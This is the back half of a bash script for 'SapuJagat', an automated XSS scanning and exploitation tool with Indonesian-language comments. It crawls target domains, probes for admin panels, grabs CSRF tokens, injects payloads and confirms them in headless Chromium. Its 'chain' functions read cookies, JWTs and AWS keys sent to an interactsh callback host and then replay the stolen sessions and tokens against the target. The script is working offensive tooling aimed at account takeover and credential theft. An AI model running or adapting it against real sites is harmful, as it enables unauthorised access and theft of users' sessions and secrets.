    echo "$combined" | grep -qi "jquery" && detected+=("jquery")
    if (( ${#detected[@]} > 0 )); then
        TECH_STACK=$(IFS=','; echo "${detected[*]}")
        ok "Tech: $TECH_STACK"
    fi
}

# ════════════════════════════════════════════════════════════
#  ADMIN DETECT
# ════════════════════════════════════════════════════════════
detect_admin() {
    local domain="$1"
    (( ADMIN_DETECT == 1 )) || return
    [[ -z "$domain" ]] && return
    info "Admin panel detect"
    for path in admin admin/login admin/users panel dashboard wp-admin wp-login.php; do
        local url="https://${domain}/${path}"
        local code; code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 "$url" 2>/dev/null || echo "000")
        case "$code" in
            200|301|302|401|403)
                [[ -z "$ADMIN_PANEL" ]] && { ADMIN_PANEL="$url"; hit "Admin: $ADMIN_PANEL"; }
                ;;
        esac
    done

    # extract CSRF
    if [[ -n "$ADMIN_PANEL" ]]; then
        local resp; resp=$(_curl "$ADMIN_PANEL") || return
        local token=$(echo "$resp" | grep -oE '<meta[^>]*name=["'"'"'](csrf-token|_csrf|authenticity_token|__RequestVerificationToken)["'"'"'][^>]*content=["'"'"']([^"'"'"']+)' | grep -oE 'content=["'"'"'][^"'"'"']+' | sed "s/content=[\"']//" | head -1)
        [[ -z "$token" ]] && token=$(echo "$resp" | grep -oE 'name="?(csrf|_token|_csrf|authenticity_token|_xsrf)"?[^>]*value="([^"]+)"' | grep -oE 'value="[^"]+"' | sed 's/value="//;s/"//' | head -1)
        [[ -n "$token" ]] && { CSRF_TOKEN="$token"; ok "CSRF token: ${token:0:20}..."; }
    fi
}

# ════════════════════════════════════════════════════════════
#  RECORD FINDING
# ════════════════════════════════════════════════════════════
record() {
    local url="$1" param="$2" payload="$3" ctx="$4" verified="$5" evidence="$6" sev="$7" shot="${8:-}"

    local score cvec
    case "$sev" in
        critical) score="9.3"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N" ;;
        high)     score="8.2"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N" ;;
        medium)   score="6.1"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N" ;;
        *)        score="4.3"; cvec="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N" ;;
    esac

    local poc=$(build_url "$url" "$param" "$payload" 2>/dev/null || echo "$url")
    local ts=$(date -Iseconds)

    {
        echo "═══════════════════════════════════════════════════════════"
        echo "[$sev] dialog_verified=$verified $ts"
        echo "Endpoint  : $url"
        echo "Parameter : $param"
        echo "Context   : $ctx"
        echo "Payload   : $payload"
        echo "Evidence  : $evidence"
        echo "CVSS      : $score ($sev) $cvec"
        [[ -n "$shot" ]] && echo "Screenshot: $shot"
        echo "PoC       : $poc"
        echo "═══════════════════════════════════════════════════════════"
        echo ""
    } | tee -a "$VULN_LOG"

    python3 - "$JSON_LOG" "$url" "$param" "$payload" "$ctx" "$verified" "$evidence" "$ts" "$score" "$sev" "$cvec" "$poc" "$shot" <<'PYJ' 2>/dev/null || true
import sys, json
f, url, param, payload, ctx, verified, evidence, ts, score, sev, cvec, poc, shot = sys.argv[1:]
try: data = json.load(open(f))
except: data = []
data.append({"ts": ts, "url": url, "param": param, "payload": payload,
             "context": ctx, "dialog_verified": verified, "evidence": evidence,
             "cvss_score": score, "severity": sev, "cvss_vector": cvec,
             "poc": poc, "screenshot": shot,
             "tool": "sapujagat", "by": "BimaKesengsaraan"})
json.dump(data, open(f, "w"), indent=2)
PYJ
    STAT_FINDINGS=$((STAT_FINDINGS+1))
    [[ "$sev" == "critical" || "$sev" == "high" ]] && STAT_IMPACT=$((STAT_IMPACT+1))
}

# ════════════════════════════════════════════════════════════
#  CHAIN ENGINE
# ════════════════════════════════════════════════════════════
record_chain() {
    local ctype="$1" target="$2" status="$3" evidence="$4"
    [[ -z "$CHAIN_LOG" ]] && return
    python3 - "$CHAIN_LOG" "$ctype" "$target" "$status" "$evidence" "$(date -Iseconds)" <<'PY' 2>/dev/null || true
import sys, json
f, ctype, tgt, status, ev, ts = sys.argv[1:]
try: data = json.load(open(f))
except: data = []
data.append({"ts": ts, "chain": ctype, "target": tgt, "status": status, "evidence": ev,
             "tool": "sapujagat", "by": "BimaKesengsaraan"})
json.dump(data, open(f, "w"), indent=2)
PY
    STAT_CHAINS=$((STAT_CHAINS+1))
}

verify_cookie_replay() {
    local cookie="$1" url="$2"
    [[ -z "$cookie" ]] && return 1
    local resp=$(_curl_cookie "$url" "$cookie") || return 1
    [[ -z "$resp" ]] && return 1
    echo "$resp" | grep -qiE '<form[^>]*login|signin|type=["'"'"']?password' && return 1
    echo "$resp" | grep -qiE 'logout|dashboard|profile|welcome|account' && return 0
    return 1
}

verify_jwt() {
    local jwt="$1" url="$2"
    [[ -z "$jwt" ]] && return 1
    local b64=$(echo "$jwt" | cut -d. -f2)
    [[ -z "$b64" ]] && return 1
    local pad=$(( 4 - ${#b64} % 4 ))
    [[ $pad -ne 4 ]] && b64="${b64}$(printf '=%.0s' $(seq 1 $pad))"
    local d=$(echo "$b64" | tr '_-' '/+' | base64 -d 2>/dev/null || echo "")
    [[ -z "$d" ]] && return 1
    echo "$d" > "$OUTDIR/impact/jwt-decoded.json"
    local host; host=$(echo "$url" | awk -F/ '{print $1"//"$3}')
    for ep in "/api/me" "/api/user" "/api/profile" "/user" "/me"; do
        local r=$(curl -sk --max-time "$TIMEOUT" -H "Authorization: Bearer $jwt" "${host}${ep}" 2>/dev/null || echo "")
        echo "$r" | grep -qE '"user"|"email"|"id"|"role"' && { echo "$r" > "$OUTDIR/impact/jwt-test.json"; return 0; }
    done
    return 1
}

chain_cookie_replay() {
    local url="$1"
    local cookie="$COOKIE"
    [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && \
        cookie=$(grep -oE 'c=[A-Za-z0-9%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null || echo "")
    [[ -z "$cookie" ]] && { record_chain "cookie-replay" "$url" "armed" "no-cookie"; return 1; }
    if verify_cookie_replay "$cookie" "$url"; then
        record_chain "cookie-replay" "$url" "verified" "session-valid"
        hit "CHAIN: cookie-replay VERIFIED"
        return 0
    fi
    record_chain "cookie-replay" "$url" "failed" "no-session"
    return 1
}

chain_jwt_decode() {
    local url="$1"
    local jwt=""
    if [[ -f "$OUTDIR/callbacks/out.jsonl" ]]; then
        local b=$(grep -oE 'ls=[A-Za-z0-9+/=%]+' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1 | cut -d= -f2)
        [[ -n "$b" ]] && jwt=$(echo "$b" | base64 -d 2>/dev/null | grep -oE '"token"\s*:\s*"[^"]+"' | head -1 | sed 's/.*"token"\s*:\s*"//;s/"$//')
    fi
    [[ -z "$jwt" ]] && { record_chain "jwt-decode" "$url" "armed" "no-jwt"; return 1; }
    if verify_jwt "$jwt" "$url"; then
        record_chain "jwt-decode" "$url" "verified" "token-valid"
        hit "CHAIN: jwt-decode VERIFIED"
        return 0
    fi
    record_chain "jwt-decode" "$url" "failed" "endpoint-reject"
    return 1
}

chain_aws_key() {
    local url="$1"
    local key=""
    [[ -f "$OUTDIR/callbacks/out.jsonl" ]] && key=$(grep -oE 'AKIA[A-Z0-9]{16}' "$OUTDIR/callbacks/out.jsonl" 2>/dev/null | head -1)
    [[ -z "$key" ]] && { record_chain "aws-key" "$url" "armed" "no-key"; return 1; }
    echo "$key" > "$OUTDIR/impact/aws-key.txt"
    record_chain "aws-key" "$url" "verified" "akia:$key"
    hit "CHAIN: aws-key VERIFIED ($key)"
    return 0
}

# ════════════════════════════════════════════════════════════
#  CALLBACK
# ════════════════════════════════════════════════════════════
interactsh_start() {
    command -v interactsh-client &>/dev/null || { warn "interactsh-client gak ada"; return 1; }
    info "Starting interactsh..."
    local out="$OUTDIR/callbacks/out.jsonl"
    local log="$OUTDIR/callbacks/log.txt"
    mkdir -p "$OUTDIR/callbacks"
    : > "$out"; : > "$log"
    interactsh-client -json -o "$out" > "$log" 2>&1 &
    INTERACTSH_PID=$!
    local tries=0
    while (( tries < 20 )); do
        local dom=$(grep -oE '[a-z0-9]{20,}\.oast\.[a-z]+' "$log" 2>/dev/null | head -1)
        [[ -n "$dom" ]] && { CALLBACK_URL="$dom"; ok "Callback: $dom"; return 0; }
        sleep 0.5; tries=$((tries+1))
    done
    warn "domain belum kebaca"
}

callback_setup() {
    (( DO_CALLBACK == 0 )) && return
    if [[ "$CALLBACK_URL" == "auto" ]]; then
        interactsh_start
    elif [[ -n "$CALLBACK_URL" ]]; then
        CALLBACK_URL="${CALLBACK_URL#https://}"
        CALLBACK_URL="${CALLBACK_URL#http://}"
        CALLBACK_URL="${CALLBACK_URL%/}"
        ok "Callback: $CALLBACK_URL"
    fi
}

# ════════════════════════════════════════════════════════════
#  SCAN — VERIFY DIALOG
# ════════════════════════════════════════════════════════════
manual_scan() {
    local targets="$1"
    [[ ! -s "$targets" ]] && return
    info "Adaptive scan with popup verify"

    local total=$(wc -l < "$targets")
    local i=0

    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        i=$((i+1))
        progress "$i" "$total" "scan"

        url="${url%%#*}"
        local base="${url%%\?*}" query="${url#*\?}"
        [[ "$query" == "$url" ]] && continue

        IFS='&' read -ra params <<< "$query"
        for p in "${params[@]}"; do
            local key="${p%%=*}"
            [[ -z "$key" ]] && continue
            [[ "$key" =~ ^(csrf|token|nonce|sess|session)$ ]] && continue
            STAT_PARAMS=$((STAT_PARAMS+1))

            local flags=$(analyze_filter "$url" "$key")
            [[ "$flags" == "NONE" ]] && continue
            vlog "flags[$key]=$flags"

            local pm="sjc${RANDOM}"
            local p_inj=$(build_url "$url" "$key" "Aa1${pm}<b>\"c'")
            local p_resp=$(_curl "$p_inj") || continue
            echo "$p_resp" | grep -qF "$pm" || continue
            local ctx=$(detect_context "$p_resp" "Aa1${pm}")
            vlog "context[$key]: $ctx"

            local rot=0
            while IFS= read -r payload; do
                [[ -z "$payload" ]] && continue
                (( rot >= MAX_ROTATION )) && break
                rot=$((rot+1))
                STAT_PAYLOADS=$((STAT_PAYLOADS+1))

                local inj=$(build_url "$url" "$key" "$payload")
                local resp=$(_curl "$inj") || continue
                echo "$resp" | grep -qF "$payload" || continue

                local shot="$OUTDIR/screenshots/$(date +%s%N).png"
                local vr=$(verify_popup "$inj" "$shot")
                local exec=$(echo "$vr" | jq -r '.executed // false' 2>/dev/null)
                local dlg=$(echo "$vr" | jq -r '.dialog_msg // ""' 2>/dev/null)

                if [[ "$exec" == "true" ]]; then
                    STAT_DIALOG=$((STAT_DIALOG+1))
                    hit "DIALOG CONFIRMED: $key @ $url"
                    echo "   payload: $payload"
                    echo "   msg: $dlg"
                    local imp=$(detect_impact "$payload")
                    local itype="${imp%%|*}"
                    local rest="${imp#*|}"
                    local isev="${rest%%|*}"
                    record "$url" "$key" "$payload" "$ctx" "true" "dialog: $dlg" "$isev" "$shot"
                    case "$itype" in
                        cookie-exfil)  chain_cookie_replay "$url" ;;
                        storage-dump)  chain_jwt_decode "$url" ;;
                        ssrf-metadata) chain_aws_key "$url" ;;
                    esac
                    break 2
                fi
            done < <(select_payloads "$ctx")
        done
    done < "$targets"
    progress_clear
    ok "Scan complete: $(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0) findings"
}

# ════════════════════════════════════════════════════════════
#  CRAWL
# ════════════════════════════════════════════════════════════
enum_subs() {
    local t="${1:-}" ; t=$(echo "$t" | sed 's|https\?://||; s|/.*||' | xargs)
    [[ -z "$t" ]] && return
    info "Subdomain enum: $t"
    : > "$OUTDIR/subs/raw.txt"
    command -v subfinder &>/dev/null && timeout 120 subfinder -d "$t" -silent -no-color 2>/dev/null | grep -iE "\.${t}$|^${t}$" | sort -u > "$OUTDIR/subs/raw.txt" || true
    command -v httpx &>/dev/null && timeout 120 httpx -l "$OUTDIR/subs/raw.txt" -silent -no-color -o "$OUTDIR/subs/live.txt" 2>/dev/null || cp "$OUTDIR/subs/raw.txt" "$OUTDIR/subs/live.txt"
    ok "Live: $(wc -l < "$OUTDIR/subs/live.txt" 2>/dev/null || echo 0)"
}

crawl() {
    local target="$1" listfile="$2"
    info "Crawl"
    : > "$OUTDIR/urls/raw.txt"
    mkdir -p "$OUTDIR/urls/sources"

    local domain=""
    [[ -n "$target" ]] && domain=$(echo "$target" | sed 's|https\?://||; s|/.*||; s|,.*||' | xargs)

    if [[ -n "$domain" ]]; then
        if command -v gau &>/dev/null; then
            timeout 60 gau --threads 5 "$domain" 2>/dev/null | grep -iE "\.${domain}" >> "$OUTDIR/urls/raw.txt" || true
        fi
        if command -v waybackurls &>/dev/null; then
            timeout 60 waybackurls "$domain" 2>/dev/null | grep -iE "\.${domain}" >> "$OUTDIR/urls/raw.txt" || true
        fi
        if command -v paramspider &>/dev/null; then
            timeout 90 paramspider -d "$domain" -s -q 2>/dev/null | grep -iE "\.${domain}" >> "$OUTDIR/urls/raw.txt" || true
        fi
        if command -v katana &>/dev/null; then
            local ct=$(mktemp)
            [[ -s "$OUTDIR/subs/live.txt" ]] && cat "$OUTDIR/subs/live.txt" > "$ct" || echo "$domain" > "$ct"
            timeout 120 katana -list "$ct" -d 2 -f qurl -silent -no-color -jc 2>/dev/null | grep -iE "\.${domain}" >> "$OUTDIR/urls/raw.txt" || true
            rm -f "$ct"
        fi
    fi

    [[ -n "$listfile" && -f "$listfile" ]] && cat "$listfile" >> "$OUTDIR/urls/raw.txt"

    grep -E '\?[^=]+=' "$OUTDIR/urls/raw.txt" 2>/dev/null | sort -u | head -n "$MAX_URLS" > "$OUTDIR/urls/targets.txt"
    [[ ! -s "$OUTDIR/urls/targets.txt" && -n "$domain" ]] && echo "https://$domain/?q=test&s=test&id=1" > "$OUTDIR/urls/targets.txt"
    STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt" 2>/dev/null || echo 0)
    ok "Targets: $STAT_URLS"
}

auto_detect() {
    local url="$1"
    info "Auto-detect URL"
    if [[ "$url" == *"?"* && "$url" == *"="* ]]; then
        ok "URL punya param"
        echo "$url" > "$OUTDIR/urls/targets.txt"
        STAT_URLS=1
        return
    fi
    : > "$OUTDIR/urls/targets.txt"
    local common="q s search query id file url redirect return next callback path page view load include"
    local found=0
    for p in $common; do
        local marker="pz${RANDOM}"
        local test_url="${url}?${p}=${marker}"
        local resp=$(_curl "$test_url") || continue
        echo "$resp" | grep -qF "$marker" && { echo "$test_url" >> "$OUTDIR/urls/targets.txt"; found=$((found+1)); }
    done
    if (( found == 0 )) && command -v katana &>/dev/null; then
        warn "fuzz 0 — katana crawl"
        timeout 60 katana -u "$url" -d 1 -f qurl -silent -no-color -jc 2>/dev/null | grep -E '\?[^=]+=' > "$OUTDIR/urls/targets.txt" || true
    fi
    [[ ! -s "$OUTDIR/urls/targets.txt" ]] && { warn "katana 0 — URL asli"; echo "$url" > "$OUTDIR/urls/targets.txt"; }
    STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt" 2>/dev/null || echo 0)
    ok "Targets: $STAT_URLS"
}

# ════════════════════════════════════════════════════════════
#  POC GENERATOR
# ════════════════════════════════════════════════════════════
gen_poc() {
    local f="$1"
    local out="$OUTDIR/exploits"
    mkdir -p "$out"
    [[ ! -s "$f" ]] && return
    local idx=0
    while IFS= read -r line; do
        idx=$((idx+1))
        local url param payload poc verified
        url=$(echo "$line" | jq -r '.url // ""')
        param=$(echo "$line" | jq -r '.param // ""')
        payload=$(echo "$line" | jq -r '.payload // ""')
        poc=$(echo "$line" | jq -r '.poc // ""')
        verified=$(echo "$line" | jq -r '.dialog_verified // "false"')
        local script="$out/poc-${idx}.sh"
        cat > "$script" <<POC
#!/usr/bin/env bash
# PoC #${idx} — ${url}
# by BimaKesengsaraan · Karya anak bangsa
# dialog_verified: ${verified}

URL='${poc}'
PAYLOAD='${payload}'

echo "[*] \$URL"
curl -s "\$URL" -o /tmp/sj-poc-${idx}.html -w "HTTP %{http_code}\n"

if grep -qF "\$PAYLOAD" /tmp/sj-poc-${idx}.html; then
    echo "[+] REFLECTED"
    echo "    open: \$URL"
else
    echo "[-] not reflected"
fi
POC
        chmod +x "$script"
    done < <(jq -c '.[]' "$f" 2>/dev/null)
    (( idx > 0 )) && ok "PoC: $out/ ($idx files)"
}

# ════════════════════════════════════════════════════════════
#  REPORT
# ════════════════════════════════════════════════════════════
gen_report() {
    local base="$OUTDIR/laporan"
    local ts=$(date -Iseconds)
    local total=$(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0)
    local verified=$(jq '[.[]|select(.dialog_verified=="true")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
    local chains=$(jq 'length' "$CHAIN_LOG" 2>/dev/null || echo 0)

    {
        echo "# SapuJagat v$VERSION Report"
        echo "**Author:** BimaKesengsaraan · Karya anak bangsa  "
        echo "**Generated:** $ts  "
        echo "**Env:** $ENV_OS  "
        echo "**Target:** ${TARGET:-$URL_LIST}  "
        echo "**WAF:** $WAF_TYPE  "
        echo "**Tech:** ${TECH_STACK:-unknown}  "
        echo "**Admin:** ${ADMIN_PANEL:-none}  "
        echo "**Playwright:** $([[ $PLAYWRIGHT_AVAILABLE == 1 ]] && echo 'available' || echo 'not installed')  "
        echo ""
        echo "## Stats"
        echo "- URLs: $STAT_URLS"
        echo "- Params: $STAT_PARAMS"
        echo "- Payloads tried: $STAT_PAYLOADS"
        echo "- Findings: $total"
        echo "- Dialog confirmed: $verified"
        echo "- Chains: $chains"
        echo ""
        echo "## Findings"
        echo '```'
        cat "$VULN_LOG"
        echo '```'
        if [[ -s "$CHAIN_LOG" ]]; then
            echo ""
            echo "## Attack Chains"
            echo '```'
            jq -r '.[] | "[\(.status)] \(.chain) → \(.target) | \(.evidence)"' "$CHAIN_LOG"
            echo '```'
        fi
    } > "${base}.md"

    {
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>SapuJagat Report</title>'
        echo '<style>body{font-family:monospace;background:#0a0a0a;color:#e0e0e0;padding:2em;max-width:1200px;margin:auto;line-height:1.5}'
        echo 'h1{color:#f33;border-bottom:2px solid #f33;padding-bottom:.3em}h2{color:#fa0;border-bottom:1px solid #333;padding-bottom:.3em;margin-top:2em}'
        echo '.f{border-left:4px solid #8c8;padding:1em;margin:1em 0;background:#161616;border-radius:4px}'
        echo '.v{border-color:#0f0}.h{border-color:#f33}.chain{background:#222;padding:.5em;margin:.3em 0;border-left:3px solid #fa0;border-radius:4px}'
        echo 'code{color:#6cf;background:#222;padding:2px 4px;border-radius:3px;word-break:break-all}'
        echo 'img{max-width:600px;margin-top:.5em;border:1px solid #333}.ok{color:#0f0;font-weight:bold}'
        echo '.stat{display:inline-block;padding:.5em 1em;background:#222;margin:.3em;border-radius:4px}'
        echo '.meta{color:#888;font-size:.9em}</style></head><body>'
        echo "<h1>SapuJagat v$VERSION — XSS Report</h1>"
        echo "<p class=\"meta\"><b>Author:</b> BimaKesengsaraan · Karya anak bangsa<br>"
        echo "<b>Generated:</b> $ts<br><b>Env:</b> $ENV_OS<br>"
        echo "<b>Target:</b> ${TARGET:-$URL_LIST}<br>"
        echo "<b>WAF:</b> $WAF_TYPE | <b>Tech:</b> ${TECH_STACK:-unknown}<br>"
        echo "<b>Admin:</b> ${ADMIN_PANEL:-none}<br>"
        echo "<b>Playwright:</b> $([[ $PLAYWRIGHT_AVAILABLE == 1 ]] && echo 'available' || echo 'NOT installed')</p>"
        echo "<h2>Stats</h2>"
        echo "<div class=\"stat\">URLs: <b>$STAT_URLS</b></div>"
        echo "<div class=\"stat\">Params: <b>$STAT_PARAMS</b></div>"
        echo "<div class=\"stat\">Payloads: <b>$STAT_PAYLOADS</b></div>"
        echo "<div class=\"stat\">Findings: <b>$total</b></div>"
        echo "<div class=\"stat\">Dialog confirmed: <b>$verified</b></div>"
        echo "<div class=\"stat\">Chains: <b>$chains</b></div>"

        if (( chains > 0 )); then
            echo "<h2>Attack Chains</h2>"
            jq -r '.[] | "<div class=\"chain\"><b>[\(.status)]</b> \(.chain) → <code>\(.target)</code><br><span class=\"meta\">\(.evidence)</span></div>"' "$CHAIN_LOG"
        fi

        if (( total > 0 )); then
            echo "<h2>Findings</h2>"
            jq -r '.[] |
                (if .dialog_verified=="true" then "f v" else "f h" end) as $cls |
                "<div class=\"\($cls)\"><b>\(.param)</b> @ <code>\(.url)</code><br>"
                + "Payload: <code>\(.payload)</code><br>"
                + "Context: \(.context)<br>"
                + (if .dialog_verified=="true" then "<span class=\"ok\">✓ DIALOG CONFIRMED</span> — \(.evidence)<br>" else "<span style=\"color:#fa0\">⚠ reflection only</span><br>" end)
                + (if .screenshot != "" then "<img src=\"\(.screenshot)\">" else "" end)
                + "</div>"' "$JSON_LOG"
        else
            echo "<p>No findings.</p>"
        fi
        echo "<p class=\"meta\" style=\"margin-top:3em;text-align:center\">SapuJagat v$VERSION by BimaKesengsaraan</p>"
        echo '</body></html>'
    } > "${base}.html"

    ok "Report: ${base}.html"
    ok "JSON  : $JSON_LOG"
    ok "Chains: $CHAIN_LOG"
    gen_poc "$JSON_LOG"
}

# ════════════════════════════════════════════════════════════
#  HELP
# ════════════════════════════════════════════════════════════
help() {
    BANNER
    cat <<EOF
${W}  USAGE${NC}
     sapujagat scan -u URL
     sapujagat scan -d DOMAIN
     sapujagat scan -l FILE
     sapujagat selftest

${W}  TARGET${NC}
     -u URL          scan single URL
     -d DOMAIN       scan domain + subdomain enum
     -l FILE         scan dari file list

${W}  FLAGS${NC}
     --deep              crawl dalam
     --fast              skip discovery
     --no-crawl          skip crawl
     --no-discovery      skip discovery
     --no-subenum        skip subdomain enum
     --no-verify         skip Playwright verify (reflection only)
     --no-impact         skip impact payload
     --no-tech           skip tech payload
     --no-waf            skip WAF bypass payload
     --no-admin          skip admin detect
     --blind URL|auto    blind XSS callback
     --rotation N        payload rotation (default 15)
     --cookie "..."      cookie session
     --proxy URL         proxy
     --verbose|-v        detail
     --quiet|-q          ringkas
     --dry-run           simulasi
     -o NAME             prefix output
     -h, --help          bantuan

${W}  VERIFY POPUP${NC}
     tool ini pakai Playwright headless untuk CEK DIALOG BENERAN.

     install Linux/Ubuntu:
       npm i -g playwright && npx playwright install chromium
       npx playwright install-deps

     install Termux (via proot Ubuntu):
       proot-distro login ubuntu
       apt update && apt install -y nodejs npm chromium
       npm i -g playwright && npx playwright install chromium
       exit

     Termux native: Playwright NOT supported. pakai --no-verify.

${W}  CONTOH${NC}
     sapujagat scan -u 'http://127.0.0.1:5000/reflected?q=test'
     sapujagat scan -u 'http://127.0.0.1:5000/attribute?q=test'
     sapujagat scan -d target.com --cookie "sess=abc"
     sapujagat scan -u 'http://t.com/?q=x' --blind auto

${M}  ═══════════════════════════════════════════════════════════════════${NC}
${D}  SapuJagat v$VERSION · MIT · Karya anak bangsa${NC}
${D}  by BimaKesengsaraan${NC}
${M}  ═══════════════════════════════════════════════════════════════════${NC}
EOF
}

# ════════════════════════════════════════════════════════════
#  SELFTEST
# ════════════════════════════════════════════════════════════
selftest() {
    echo ""
    echo -e "${M}   Selftest v$VERSION${NC}"
    echo ""
    local pass=0 fail=0
    _t() {
        local name="$1"; shift
        printf "   %-42s " "$name"
        if "$@" &>/dev/null; then echo -e "${G}✓${NC}"; pass=$((pass+1))
        else echo -e "${R}✗${NC}"; fail=$((fail+1)); fi
    }
    _t "curl" command -v curl
    _t "jq" command -v jq
    _t "python3" command -v python3
    _t "node" command -v node
    _t "npx" command -v npx
    _t "playwright" bash -c 'npx playwright --version &>/dev/null'
    _t "chromium cache" bash -c 'ls ~/.cache/ms-playwright/chromium-* &>/dev/null'
    _t "subfinder" command -v subfinder
    _t "httpx" command -v httpx
    _t "katana" command -v katana
    _t "gau" command -v gau
    _t "waybackurls" command -v waybackurls
    _t "paramspider" command -v paramspider
    _t "interactsh-client" command -v interactsh-client
    _t "fn _curl" declare -F _curl
    _t "fn build_url" declare -F build_url
    _t "fn detect_context" declare -F detect_context
    _t "fn analyze_filter" declare -F analyze_filter
    _t "fn p_body" declare -F p_body
    _t "fn p_attr_dq" declare -F p_attr_dq
    _t "fn p_attr_sq" declare -F p_attr_sq
    _t "fn p_script" declare -F p_script
    _t "fn p_href" declare -F p_href
    _t "fn p_impact" declare -F p_impact
    _t "fn p_waf" declare -F p_waf
    _t "fn p_tech" declare -F p_tech
    _t "fn select_payloads" declare -F select_payloads
    _t "fn verify_popup" declare -F verify_popup
    _t "fn manual_scan" declare -F manual_scan
    _t "fn crawl" declare -F crawl
    _t "fn detect_admin" declare -F detect_admin
    _t "fn gen_report" declare -F gen_report
    _t "fn chain_cookie_replay" declare -F chain_cookie_replay
    _t "fn chain_jwt_decode" declare -F chain_jwt_decode
    _t "fn chain_aws_key" declare -F chain_aws_key
    echo ""
    echo -e "   ${G}PASS${NC}: $pass  ${R}FAIL${NC}: $fail"
    echo ""
    (( fail == 0 )) && return 0 || return 1
}

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════
main() {
    local cmd="${1:-}"
    case "$cmd" in
        version|--version) echo "$VERSION"; exit 0 ;;
        ""|-h|--help|help) help; exit 0 ;;
        selftest|--selftest) selftest; exit $? ;;
        scan) shift ;;
        *) help; exit 1 ;;
    esac

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--url) INPUT_MODE="url"; TARGET="$2"; DOMAIN=$(detect_domain "$TARGET"); shift 2 ;;
            -d|--domain) INPUT_MODE="domain"; TARGET="$2"; DOMAIN=$(detect_domain "$TARGET"); shift 2 ;;
            -l|--list) INPUT_MODE="list"; URL_LIST="$2"; [[ -f "$URL_LIST" ]] || { err "file: $URL_LIST"; exit 1; }; DOMAIN=$(detect_domain "$URL_LIST"); shift 2 ;;
            --deep) shift ;;
            --fast) DO_DISCOVERY=0; shift ;;
            --no-crawl) DO_CRAWL=0; shift ;;
            --no-discovery) DO_DISCOVERY=0; shift ;;
            --no-subenum) SKIP_SUBENUM=1; shift ;;
            --no-verify) VERIFY_HEADLESS=0; shift ;;
            --no-impact) IMPACT_PAYLOAD=0; shift ;;
            --no-tech) TECH_PAYLOAD=0; shift ;;
            --no-waf) WAF_BYPASS=0; shift ;;
            --no-admin) ADMIN_DETECT=0; shift ;;
            --blind|--callback) CALLBACK_URL="$2"; DO_CALLBACK=1; shift 2 ;;
            --rotation) MAX_ROTATION="$2"; shift 2 ;;
            --cookie) COOKIE="$2"; shift 2 ;;
            --proxy) PROXY="$2"; shift 2 ;;
            --verbose|-v) VERBOSE=1; shift ;;
            --quiet|-q) QUIET=1; shift ;;
            --dry-run) DRY_RUN=1; shift ;;
            -o|--output) OUTDIR_BASE="$2"; shift 2 ;;
            -h|--help) help; exit 0 ;;
            *) warn "Unknown: $1"; shift ;;
        esac
    done

    [[ -z "$INPUT_MODE" ]] && { err "Kasih -u, -d, atau -l"; exit 1; }

    detect_env
    log_init

    BANNER
    box "SCAN START"
    kv "Env"      "$ENV_OS"
    kv "Mode"     "$INPUT_MODE"
    kv "Target"   "${TARGET:-$URL_LIST}"
    kv "Domain"   "${DOMAIN:-N/A}"
    kv "Rotation" "$MAX_ROTATION"
    kv "Output"   "$OUTDIR"
    echo ""

    check_playwright
    write_verifier
    callback_setup

    local miss=()
    for c in curl jq python3; do command -v "$c" &>/dev/null || miss+=("$c"); done
    [[ ${#miss[@]} -gt 0 ]] && { err "Missing: ${miss[*]}"; exit 1; }

    if [[ -n "$DOMAIN" ]]; then
        local code=$(curl -sk -o /dev/null -w '%{http_code}' --connect-timeout 5 "https://$DOMAIN" 2>/dev/null || echo "000")
        case "$code" in
            000) warn "$DOMAIN unreachable" ;;
            200|301|302|401|403) ok "Target reachable ($code)" ;;
        esac
    fi

    local total_phases=6
    local cur=0

    if [[ "$INPUT_MODE" == "domain" && "$SKIP_SUBENUM" == "0" ]]; then
        cur=$((cur+1))
        ph "$cur" "$total_phases" "Subdomain Enum"
        enum_subs "$TARGET"
        phe
    fi

    if [[ "$INPUT_MODE" == "url" ]]; then
        cur=$((cur+1))
        ph "$cur" "$total_phases" "Auto-detect"
        auto_detect "$TARGET"
        phe
    elif [[ "$INPUT_MODE" == "domain" || "$INPUT_MODE" == "list" ]]; then
        cur=$((cur+1))
        ph "$cur" "$total_phases" "Crawl"
        (( DO_CRAWL == 1 )) && crawl "$TARGET" "$URL_LIST" || {
            : > "$OUTDIR/urls/targets.txt"
            [[ -n "$URL_LIST" ]] && head -50 "$URL_LIST" > "$OUTDIR/urls/targets.txt"
            [[ -z "$URL_LIST" ]] && echo "https://$DOMAIN/?q=test" > "$OUTDIR/urls/targets.txt"
            STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt")
            ok "Crawl skipped — $STAT_URLS"
        }
        phe
    fi

    (( DO_DISCOVERY == 1 )) && {
        cur=$((cur+1))
        ph "$cur" "$total_phases" "Discovery"
        detect_admin "$DOMAIN" 2>/dev/null || true
        fingerprint_waf "$OUTDIR/urls/targets.txt"
        fingerprint_tech "$OUTDIR/urls/targets.txt"
        phe
    }

    cur=$((cur+1))
    ph "$cur" "$total_phases" "Scan + Dialog Verify"
    manual_scan "$OUTDIR/urls/targets.txt"
    phe

    cur=$((cur+1))
    ph "$cur" "$total_phases" "Report"
    gen_report
    phe

    local total verified chains
    total=$(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0)
    verified=$(jq '[.[]|select(.dialog_verified=="true")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
    chains=$(jq 'length' "$CHAIN_LOG" 2>/dev/null || echo 0)

    box "SCAN COMPLETE"
    kv "Findings"         "$total"
